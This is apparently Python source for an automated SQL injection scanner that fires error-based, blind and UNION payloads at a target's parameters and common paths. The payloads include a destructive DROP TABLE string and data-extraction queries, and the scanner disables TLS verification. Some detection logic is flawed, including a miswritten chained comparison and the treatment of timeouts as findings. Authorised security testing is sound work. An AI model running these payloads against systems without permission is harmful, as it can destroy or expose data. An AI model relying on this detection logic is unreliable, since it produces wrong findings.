"""
Jarwis AGI Pen Test - SQL Injection Scanner (Advanced)
Detects SQL Injection vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, quote, parse_qs
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class SQLInjectionScanner:
    """
    Advanced SQL Injection Scanner
    OWASP A03:2021 - Injection
    
    Attack vectors:
    - Error-based SQLi
    - Boolean-based blind SQLi
    - Time-based blind SQLi
    - UNION-based SQLi
    - Stacked queries
    - Second-order SQLi
    - Out-of-band SQLi
    """
    
    # Database error patterns
    DB_ERRORS = {
        'mysql': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQL Query fail',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'com\.mysql\.jdbc',
            r'Unclosed quotation mark',
        ],
        'postgresql': [
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'PSQLException',
        ],
        'mssql': [
            r'Driver.* SQL[\-\_\ ]*Server',
            r'OLE DB.* SQL Server',
            r'SQLServer JDBC Driver',
            r'SqlClient\.',
            r'Unclosed quotation mark after the character string',
            r'\bODBC SQL Server Driver\b',
        ],
        'oracle': [
            r'\bORA-\d{5}',
            r'Oracle error',
            r'Warning.*oci_',
            r'Oracle.*Driver',
            r'OracleException',
        ],
        'sqlite': [
            r'SQLite\/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'SQLITE_ERROR',
            r'sqlite3\.OperationalError',
        ],
        'generic': [
            r'SQL syntax',
            r'syntax error',
            r'unexpected end of SQL',
            r'quoted string not properly terminated',
            r'SQL command not properly ended',
        ],
    }
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        '`',
        '"',
        ')',
        '(',
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 OR 1=1",
        "1' OR '1'='1",
        "admin'--",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "') OR ('1'='1",
        "1; SELECT 1",
    ]
    
    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        # True condition
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1' OR '1'='1' --", "1' OR '1'='2' --"),
        ("1) AND (1=1", "1) AND (1=2"),
    ]
    
    # Time-based payloads (5 second sleep)
    TIME_PAYLOADS = {
        'mysql': [
            "'; SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1; SELECT SLEEP(5)--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "' OR pg_sleep(5)--",
            "1'; SELECT pg_sleep(5)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ],
        'oracle': [
            "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a",
            "1' AND DBMS_LOCK.SLEEP(5)--",
        ],
        'sqlite': [
            "' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
        ],
    }
    
    # UNION-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT 1,2,@@version--",
    ]
    
    # Common vulnerable parameters
    SQLI_PARAMS = [
        'id', 'user', 'username', 'uid', 'pid', 'item', 'product',
        'category', 'cat', 'name', 'order', 'sort', 'search', 'query',
        'q', 'page', 'email', 'type', 'date', 'year', 'month', 'day',
        'from', 'to', 'view', 'table', 'dir', 'filter', 'select',
        'report', 'role', 'update', 'key', 'column', 'field', 'row',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Advanced SQL Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_sqli(session, ep_url)
            
            # Test common vulnerable paths
            sqli_paths = [
                '/product.php', '/item.php', '/user.php', '/profile.php',
                '/search.php', '/category.php', '/view.php', '/detail.php',
                '/api/users', '/api/products', '/api/search', '/api/items',
            ]
            
            for path in sqli_paths:
                url = urljoin(base_url, path)
                await self._test_sqli(session, url)
        
        logger.info(f"SQL injection scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_sqli(self, session: aiohttp.ClientSession, url: str):
        """Test URL for SQL injection"""
        
        # Test GET parameters
        for param in self.SQLI_PARAMS[:15]:
            # Error-based testing
            await self._test_error_based(session, url, param)
            
            # Boolean-based testing
            await self._test_boolean_based(session, url, param)
            
            # Time-based testing
            await self._test_time_based(session, url, param)
        
        # Test POST parameters
        for param in self.SQLI_PARAMS[:10]:
            await self._test_error_based(session, url, param, method='POST')
    
    async def _test_error_based(self, session: aiohttp.ClientSession, url: str,
                                param: str, method: str = 'GET'):
        """Test for error-based SQL injection"""
        
        for i, payload in enumerate(self.ERROR_PAYLOADS[:10]):
            # VERBOSE LOGGING: Show each payload being tested
            logger.info(f"[SQLi-ADV] Error-based test {i+1}/10 on {param} ({method}): {payload}")
            
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                if method == 'GET':
                    separator = '&' if '?' in url else '?'
                    test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
                    
                    async with session.get(test_url) as response:
                        body = await response.text()
                        
                        db_type, error = self._check_sql_error(body)
                        if db_type:
                            logger.info(f"[SQLi-ADV] ✓ VULNERABLE! {db_type} error detected")
                            result = ScanResult(
                                id=f"SQLI-ERROR-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="critical",
                                title=f"Error-based SQL Injection ({db_type})",
                                description=f"Parameter '{param}' vulnerable to SQL injection.",
                                url=test_url,
                                method="GET",
                                parameter=param,
                                evidence=error[:200],
                                remediation="Use parameterized queries. Never concatenate user input.",
                                cwe_id="CWE-89",
                                poc=payload,
                                reasoning=f"Database error ({db_type}) triggered by payload"
                            )
                            self.results.append(result)
                            return
                            
                else:  # POST
                    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                    data = {param: payload}
                    
                    async with session.post(url, data=data, headers=headers) as response:
                        body = await response.text()
                        
                        db_type, error = self._check_sql_error(body)
                        if db_type:
                            result = ScanResult(
                                id=f"SQLI-ERROR-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="critical",
                                title=f"Error-based SQL Injection via POST ({db_type})",
                                description=f"POST parameter '{param}' vulnerable to SQL injection.",
                                url=url,
                                method="POST",
                                parameter=param,
                                evidence=error[:200],
                                remediation="Use parameterized queries.",
                                cwe_id="CWE-89",
                                poc=payload,
                                reasoning=f"Database error ({db_type}) in POST request"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"Error-based SQLi test error: {e}")
    
    async def _test_boolean_based(self, session: aiohttp.ClientSession, url: str, param: str):
        """Test for boolean-based blind SQL injection"""
        
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS[:3]:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                separator = '&' if '?' in url else '?'
                
                # Send true condition
                true_url = f"{url}{separator}{param}={quote(true_payload, safe='')}"
                async with session.get(true_url) as true_resp:
                    true_body = await true_resp.text()
                    true_status = true_resp.status
                    true_len = len(true_body)
                
                await asyncio.sleep(0.5)
                
                # Send false condition
                false_url = f"{url}{separator}{param}={quote(false_payload, safe='')}"
                async with session.get(false_url) as false_resp:
                    false_body = await false_resp.text()
                    false_status = false_resp.status
                    false_len = len(false_body)
                
                # Check for different responses
                if self._responses_differ(true_status, false_status, true_len, false_len, true_body, false_body):
                    result = ScanResult(
                        id=f"SQLI-BOOLEAN-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="high",
                        title="Boolean-based Blind SQL Injection",
                        description=f"Parameter '{param}' shows different responses for boolean conditions.",
                        url=url,
                        method="GET",
                        parameter=param,
                        evidence=f"True: {true_len} bytes, False: {false_len} bytes",
                        remediation="Use parameterized queries.",
                        cwe_id="CWE-89",
                        poc=f"True: {true_payload}, False: {false_payload}",
                        reasoning="Response differs between true and false SQL conditions"
                    )
                    self.results.append(result)
                    return
                    
            except Exception as e:
                logger.debug(f"Boolean-based SQLi test error: {e}")
    
    async def _test_time_based(self, session: aiohttp.ClientSession, url: str, param: str):
        """Test for time-based blind SQL injection"""
        
        # Test each database type
        for db_type, payloads in self.TIME_PAYLOADS.items():
            for payload in payloads[:2]:
                try:
                    separator = '&' if '?' in url else '?'
                    test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
                    
                    # Longer timeout for time-based
                    timeout = aiohttp.ClientTimeout(total=15)
                    
                    start_time = asyncio.get_event_loop().time()
                    
                    async with session.get(test_url, timeout=timeout) as response:
                        await response.text()
                        
                    elapsed = asyncio.get_event_loop().time() - start_time
                    
                    # If response took ~5 seconds, likely vulnerable
                    if elapsed >= 4:
                        result = ScanResult(
                            id=f"SQLI-TIME-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title=f"Time-based Blind SQL Injection ({db_type})",
                            description=f"Parameter '{param}' shows time delay on SQL sleep.",
                            url=test_url,
                            method="GET",
                            parameter=param,
                            evidence=f"Response delayed by {elapsed:.2f} seconds",
                            remediation="Use parameterized queries.",
                            cwe_id="CWE-89",
                            poc=payload,
                            reasoning=f"{elapsed:.2f}s delay confirms SQL injection"
                        )
                        self.results.append(result)
                        return
                        
                except asyncio.TimeoutError:
                    # Timeout could mean successful sleep
                    result = ScanResult(
                        id=f"SQLI-TIME-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="high",
                        title=f"Potential Time-based SQL Injection ({db_type})",
                        description=f"Parameter '{param}' caused request timeout.",
                        url=url,
                        method="GET",
                        parameter=param,
                        evidence="Request timed out after SQL sleep payload",
                        remediation="Use parameterized queries.",
                        cwe_id="CWE-89",
                        poc=payload,
                        reasoning="Timeout suggests SQL sleep executed"
                    )
                    self.results.append(result)
                    return
                    
                except Exception as e:
                    logger.debug(f"Time-based SQLi test error: {e}")
    
    def _check_sql_error(self, body: str) -> Tuple[Optional[str], str]:
        """Check response for SQL error messages"""
        for db_type, patterns in self.DB_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        return None, ""
    
    def _responses_differ(self, status1: int, status2: int, 
                         len1: int, len2: int,
                         body1: str, body2: str) -> bool:
        """Check if two responses differ significantly"""
        
        # Different status codes
        if status1 != status2:
            return True
        
        # Significant length difference (>10%)
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > 0.1:
                return True
        
        # Check content differences
        if 'error' in body1.lower() != 'error' in body2.lower():
            return True
        
        if 'not found' in body1.lower() != 'not found' in body2.lower():
            return True
        
        return False


class UnionBasedSQLiScanner:
    """
    Specialized UNION-based SQL Injection Scanner
    OWASP A03:2021 - Injection
    """
    
    # Column count detection
    ORDER_BY_PAYLOADS = [
        "' ORDER BY 1--",
        "' ORDER BY 5--",
        "' ORDER BY 10--",
        "' ORDER BY 20--",
    ]
    
    # Data extraction payloads
    EXTRACT_PAYLOADS = {
        'mysql': "' UNION SELECT 1,@@version,user(),database()--",
        'postgresql': "' UNION SELECT 1,version(),current_user,current_database()--",
        'mssql': "' UNION SELECT 1,@@version,user_name(),db_name()--",
        'oracle': "' UNION SELECT 1,banner,user,null FROM v$version--",
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting UNION-based SQL Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints with ID-like params
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url and ('id=' in ep_url or 'product=' in ep_url or 'item=' in ep_url):
                        await self._test_union_sqli(session, ep_url)
        
        logger.info(f"UNION SQLi scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_union_sqli(self, session: aiohttp.ClientSession, url: str):
        """Test for UNION-based SQL injection"""
        
        # Try different column counts
        for col_count in range(1, 10):
            nulls = ','.join(['NULL'] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                # Replace existing parameter value
                if '=' in url:
                    test_url = url.rsplit('=', 1)[0] + '=' + quote(payload, safe='')
                else:
                    test_url = url + '?id=' + quote(payload, safe='')
                
                async with session.get(test_url) as response:
                    body = await response.text()
                    
                    # Check if UNION query worked (no column count error)
                    if 'number of columns' not in body.lower() and response.status == 200:
                        # Check for data in response
                        if 'null' in body.lower() or len(body) > 100:
                            result = ScanResult(
                                id=f"SQLI-UNION-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="critical",
                                title=f"UNION-based SQL Injection ({col_count} columns)",
                                description="UNION query executed successfully.",
                                url=test_url,
                                method="GET",
                                evidence=f"UNION with {col_count} columns accepted",
                                remediation="Use parameterized queries.",
                                cwe_id="CWE-89",
                                poc=payload,
                                reasoning=f"UNION SELECT with {col_count} NULLs worked"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"UNION SQLi test error: {e}")
